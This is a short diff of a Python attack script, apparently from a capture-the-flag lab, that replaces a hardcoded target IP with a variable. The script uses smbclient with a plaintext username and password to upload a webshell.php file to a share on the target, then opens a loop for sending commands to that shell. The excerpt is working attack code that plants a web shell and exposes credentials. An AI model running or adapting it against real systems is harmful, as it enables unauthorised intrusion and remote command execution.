@@ -12,13 +12,13 @@ import os
 import datetime
 
 # Configuration
-TARGET_IP = "10.129.6.180"
+TARGET_IP = "10.129.7.134"
 PORT = "8808"
 SHELL_PATH = "webshell.php"
 URL = f"http://{TARGET_IP}:{PORT}/{SHELL_PATH}"
 
 # setup web shell
-os.system('''smbclient '//10.129.6.180/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put ./webshell.php webshell.php' ''')
+os.system(f'''smbclient '//{TARGET_IP}/new-site' -U 'tyler' --password '92g!mA8BGjOirkL%OG*&' -c 'put ./webshell.php webshell.php' ''')
 
 def shell_repl():
     print(f"[*] Connecting to web shell at: {URL}")
